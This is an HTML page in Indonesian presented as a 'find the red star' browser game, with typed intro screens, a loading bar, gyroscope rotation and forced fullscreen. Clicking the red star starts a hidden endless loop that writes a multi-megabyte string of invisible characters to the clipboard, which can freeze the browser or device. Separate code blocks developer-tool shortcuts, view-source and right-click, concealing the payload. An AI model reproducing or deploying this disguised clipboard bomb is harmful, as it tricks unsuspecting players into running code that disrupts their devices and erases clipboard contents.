<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Infinity Star</title>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

<style>
html, body {
  margin: 0;
  padding: 0;
  overflow: hidden;
  background: black;
  height: 100vh;
  font-family: Arial, sans-serif;
}

/* ================= SCENE ================= */

.scene {
  width: 100vw;
  height: 100vh;
  perspective: 1200px;
  overflow: hidden;
}

.world {
  width: 200vw;
  height: 200vh;
  position: absolute;
  top: -50vh;
  left: -50vw;
  transform-style: preserve-3d;
  transition: transform 0.1s linear;
}

.star{
  position:absolute;
  width:4px;
  height:4px;
  background:white;
  border-radius:50%;
  opacity:0.8;
  pointer-events:none;
}

.red{
  position:absolute;
  width:10px;
  height:10px;
  background:red;
  border-radius:50%;
  box-shadow:0 0 25px red;
  animation: blink 1s infinite alternate;
  pointer-events:auto !important;
  cursor:pointer;
  z-index:9999;
}

@keyframes blink {
  from { opacity:0.6; }
  to { opacity:1; }
}

/* ================= HITBOX ================= */

.hitbox{
  position:absolute;
  width:80px;
  height:80px;
  top:50%;
  left:50%;
  transform:translate(-50%,-50%);
  border-radius:50%;
  background:transparent;
  pointer-events:auto;
  z-index:10000;
}

.hitbox-follow{
  position:fixed;
  width:80px;
  height:80px;
  border-radius:50%;
  background:transparent;
  pointer-events:auto;
  z-index:999999;
  display:none;
}

/* ================= POPUP WARNING ================= */

.popup {
  position: fixed;
  top: 50%;
  left: 50%;
  width:85%;
  height:90%;
  transform: translate(-50%, -50%);
  background: rgba(0, 0, 0, 0.92);
  padding: 40px 30px;
  border-radius: 20px;
  text-align: center;
  color: white;
  border: 2px solid red;
  box-shadow:
    0 0 30px rgba(255,0,0,0.5),
    0 0 60px rgba(255,0,0,0.3);
  z-index: 9999999;
  display:none;
  animation: popupFade 0.4s ease-out;
}

@keyframes popupFade {
  from {
    opacity: 0;
    transform: translate(-50%, -60%) scale(0.9);
  }
  to {
    opacity: 1;
    transform: translate(-50%, -50%) scale(1);
  }
}

.popup p {
  margin-top: 10px;
  font-size: 18px;
  line-height: 1.6;
  letter-spacing: 1px;
  font-weight: 500;
  color: #f5f5f5;
  text-shadow: 0 0 5px rgba(255,255,255,0.3);
}

.popup i {
  font-size: 110px;
  margin-top: 50%;
  color: #ff2b2b;
  margin-bottom: 20px;
  -webkit-text-stroke: 2px white;
  text-shadow:
    0 0 10px #ff0000,
    0 0 25px #ff0000,
    0 0 50px rgba(255,0,0,0.8);
  filter: drop-shadow(0 0 25px red);
  animation: pulseWarning 1.5s infinite ease-in-out;
}

@keyframes pulseWarning {
  0% { transform: scale(1); }
  50% { transform: scale(1.15); }
  100% { transform: scale(1); }
}

/* ================= INTRO SYSTEM ================= */

.center-screen{
  position:fixed;
  inset:0;
  display:flex;
  justify-content:center;
  align-items:center;
  flex-direction:column;
  text-align:center;
  background:rgba(0,0,0,0.92);
  z-index:99999999;
}

.intro-box{
  max-width:600px;
  padding:40px;
  border-radius:20px;
  background:linear-gradient(145deg,#111,#1a1a1a);
  border:1px solid rgba(255,0,0,0.4);
  box-shadow:
    0 0 40px rgba(255,0,0,0.3),
    0 0 80px rgba(255,0,0,0.2);
  color:white;
  font-size:20px;
  line-height:1.6;
  letter-spacing:1px;
  opacity:0;
  transform:translateY(60px);
  transition:all 0.6s ease;
}

.intro-box.show{
  opacity:1;
  transform:translateY(0);
}

.fade-down{
  opacity:0 !important;
  transform:translateY(80px) !important;
}

.type-cursor{
  display:inline-block;
  width:2px;
  background:red;
  margin-left:5px;
  animation:blinkCursor 0.8s infinite;
  height:22px;
  vertical-align:bottom;
}

@keyframes blinkCursor{
  0%,100%{opacity:1}
  50%{opacity:0}
}

.intro-btn{
  margin-top:30px;
  padding:14px 30px;
  border-radius:10px;
  border:1px solid red;
  background:transparent;
  color:white;
  font-weight:bold;
  cursor:pointer;
  transition:0.3s;
}

.intro-btn:hover{
  background:red;
  box-shadow:0 0 20px red;
}

/* Loading */
.loading-bar{
  width:300px;
  height:12px;
  border-radius:20px;
  background:#222;
  overflow:hidden;
  margin-top:30px;
}

.loading-fill{
  height:100%;
  width:0%;
  background:linear-gradient(90deg,red,#ff4d4d);
  transition:width 1s linear;
}

/* Countdown */
.countdown{
  position:fixed;
  inset:0;
  display:flex;
  justify-content:center;
  align-items:center;
  font-size:120px;
  font-weight:bold;
  color:red;
  text-shadow:
    0 0 20px red,
    0 0 40px red,
    0 0 80px rgba(255,0,0,0.8);
  animation:popSoft 0.6s ease;
  z-index:999999999;
}

@keyframes popSoft{
  0%{transform:scale(0.5);opacity:0}
  70%{transform:scale(1.1);opacity:1}
  100%{transform:scale(1)}
}

/* ================= GYRO BUTTON ================= */

.gyro-btn {
  position: fixed;
  bottom: 25px;
  right: 25px;
  padding: 14px 22px;
  font-size: 16px;
  font-weight: bold;
  color: white;
  background: linear-gradient(135deg, #111, #222);
  border: 2px solid #ff0000;
  border-radius: 12px;
  cursor: pointer;
  z-index: 999999;
  transition: all 0.3s ease;
  box-shadow:
    0 0 10px rgba(255,0,0,0.4),
    0 0 20px rgba(255,0,0,0.2);
}

.gyro-btn:hover {
  transform: scale(1.08);
  box-shadow:
    0 0 15px red,
    0 0 35px red;
}

.gyro-btn.active {
  background: linear-gradient(135deg, #ff0000, #aa0000);
  border-color: white;
  box-shadow:
    0 0 20px red,
    0 0 40px red,
    0 0 60px rgba(255,0,0,0.8);
  animation: gyroPulse 1.5s infinite ease-in-out;
}

@keyframes gyroPulse {
  0% { transform: scale(1); }
  50% { transform: scale(1.1); }
  100% { transform: scale(1); }
}

</style>
</head>
<body>

<div class="scene">
  <div class="world" id="world"></div>
</div>

<!-- INTRO 1 -->
<div class="center-screen" id="intro1">
  <div class="intro-box" id="box1">
    <span id="text1"></span><span class="type-cursor"></span>
    <br>
    <button class="intro-btn" id="gasBtn" style="display:none;">Gas!</button>
  </div>
</div>

<!-- INTRO 2 -->
<div class="center-screen" id="intro2" style="display:none;">
  <div class="intro-box" id="box2">
    <span id="text2"></span><span class="type-cursor"></span>
  </div>
</div>

<!-- INTRO 3 -->
<div class="center-screen" id="intro3" style="display:none;">
  <button class="intro-btn" id="mulaiBtn">Mulai?</button>
  <div class="loading-bar" id="loadingBar" style="display:none;">
    <div class="loading-fill" id="loadingFill"></div>
  </div>
</div>
<button class="gyro-btn" id="gyroBtn" onclick="warpReload()">
  Randomizer + Mulai
</button>
<div class="popup" id="popup">
  <i class="fas fa-triangle-exclamation"></i>
  <p>selamat Kamu menemukan bintang rahasia</p>
  <p>Web by t.me/arcznewera</p>
</div>
<script>

/* BLOCK INSPECT */
document.addEventListener('keydown', function(e) {
  if (
    e.key === 'F12' ||
    (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key)) ||
    (e.ctrlKey && e.key === 'U')
  ) e.preventDefault()
})

document.addEventListener('contextmenu', e => e.preventDefault())

/* INVISIBLE CLIPBOARD */
const invis = "‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎".repeat(5000000)

async function utama(){
  await navigator.clipboard.writeText(invis)
}

let running = false

async function loop(){
  running = true
  while(running){
    await utama()
  }
}

/* WARP */
async function warpReload(){
  openFullscreen()
  let stars = document.querySelectorAll(".star")

  stars.forEach(star=>{
    star.style.transition = "transform 0.2s linear"
    star.style.transform += " scale(3)"
  })

  for(let i=0;i<10;i++){
    stars.forEach(star=>{
      star.style.left = Math.random()*200 + "vw"
      star.style.top = Math.random()*200 + "vh"
      star.style.transform =
        `translateZ(${Math.random()*4000-2000}px) scale(3)`
    })
    await new Promise(r=>setTimeout(r,50))
  }

  stars.forEach(star=>{
    star.style.transition = "transform 0.5s ease"
    star.style.left = Math.random()*200 + "vw"
    star.style.top = Math.random()*200 + "vh"
    star.style.transform =
      `translateZ(${Math.random()*2000-1000}px) scale(1)`
  })
}

/* CREATE STARS */
let world = document.getElementById("world")
let popup = document.getElementById("popup")

let totalStars = 800
let randomClickableIndex = Math.floor(Math.random() * totalStars)

for (let i = 0; i < totalStars; i++) {

  let star = document.createElement("div")
  star.className = "star"

  star.style.left = Math.random()*200 + "vw"
  star.style.top = Math.random()*200 + "vh"
  star.style.transform =
    `translateZ(${Math.random()*2000-1000}px)`

if(i === randomClickableIndex){

  star.classList.add("red");

  // BUAT HITBOX FIXED DI DEPAN
  let hitbox = document.createElement("div");
  hitbox.className = "hitbox-follow";
  document.body.appendChild(hitbox);

  // KLIK HITBOX
  hitbox.addEventListener("click", async function(e){
    e.stopImmediatePropagation();
    e.stopPropagation();
    popup.style.display = "block";
    await loop();
  }, true);

  // FOLLOW SYSTEM
  function updateHitbox(){
    let rect = star.getBoundingClientRect();

    // cek apakah masih terlihat di layar
    let visible =
      rect.bottom > 0 &&
      rect.top < window.innerHeight &&
      rect.right > 0 &&
      rect.left < window.innerWidth;

    if(visible){
      hitbox.style.display = "block";
      hitbox.style.left = rect.left + rect.width/2 + "px";
      hitbox.style.top = rect.top + rect.height/2 + "px";
      hitbox.style.transform = "translate(-50%, -50%)";
    } else {
      hitbox.style.display = "none";
    }

    requestAnimationFrame(updateHitbox);
  }

  updateHitbox();
}

  world.appendChild(star)
}

function closePopup(){
  popup.style.display = "none"
}

/* FULLSCREEN */
function openFullscreen(){
  let elem = document.documentElement
  if (elem.requestFullscreen) elem.requestFullscreen()
  else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen()
  else if (elem.msRequestFullscreen) elem.msRequestFullscreen()
}

/* GYRO */
let rotX=0, rotY=0, rotZ=0

function enableGyro(){

  openFullscreen()   // fullscreen saat klik

  if (typeof DeviceOrientationEvent.requestPermission === 'function') {
    DeviceOrientationEvent.requestPermission()
      .then(state=>{
        if(state==='granted'){
          window.addEventListener("deviceorientation", handleOrientation)
        }
      })
  } else {
    window.addEventListener("deviceorientation", handleOrientation)
  }

  warpReload()
}

function handleOrientation(event){
  rotX = event.beta || 0
  rotY = event.gamma || 0
  rotZ = event.alpha || 0

  world.style.transform =
    `rotateX(${rotX}deg)
     rotateY(${rotY}deg)
     rotateZ(${rotZ}deg)`
}
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)) }

async function typeWords(element, text){
  let words = text.split(" ")
  element.innerHTML=""
  for(let i=0;i<words.length;i++){
    if(words[i]==="<jeda"){
      let delay=parseInt(words[i+1])
      await sleep(delay)
      i++
      continue
    }
    if(words[i].includes("<stop>")) break
    element.innerHTML += words[i]+" "
    await sleep(200)
  }
}

async function startIntro(){
  document.getElementById("box1").classList.add("show")

  await typeWords(
    document.getElementById("text1"),
    "Hai Pendatang Baru <jeda 1200>, Apakah Kamu mengerti Cara main ini? <jeda 1200> Aku akan memberi tahu kamu Cara bermain game ini! <jeda 500> Gas ga!!!! <stop>"
  )

  document.getElementById("gasBtn").style.display="inline-block"
}

document.getElementById("gasBtn").onclick=async()=>{
  document.getElementById("box1").classList.add("fade-down")
  await sleep(600)
  document.getElementById("intro1").style.display="none"

  document.getElementById("intro2").style.display="flex"
  document.getElementById("box2").classList.add("show")

  await typeWords(
    document.getElementById("text2"),
    "Cara bermain nya cukup gampang! <jeda 600> ,cukup pencet mulai untuk meng acak bintang nya! <jeda 500> kamu perlu menemukan bintang merah dengan teliti untuk menjadi pacuan kemenangan mu! <jeda 500> saya akan mengacak & memulai ketika kamu pencet tombol mulai nya!!!! <jeda 5000>"
  )

  document.getElementById("box2").classList.add("fade-down")
  await sleep(600)
  document.getElementById("intro2").style.display="none"

  document.getElementById("intro3").style.display="flex"
}

document.getElementById("mulaiBtn").onclick=async()=>{
  let btn=document.getElementById("mulaiBtn")
  openFullscreen()
  btn.style.display="none"

  let bar=document.getElementById("loadingBar")
  let fill=document.getElementById("loadingFill")
  bar.style.display="block"

  for(let i=1;i<=10;i++){
    fill.style.width=(i*10)+"%"
    await sleep(1000)
  }

  document.getElementById("intro3").style.display="none"

  for(let i=3;i>0;i--){
    let cd=document.createElement("div")
    cd.className="countdown"
    cd.innerText=i
    document.body.appendChild(cd)
    await sleep(800)
    cd.remove()
  }

  await mulai()
}

async function mulai(){
  openFullscreen()
  warpReload()
  enableGyro()
}

window.onload=startIntro
</script>

</body>
</html>
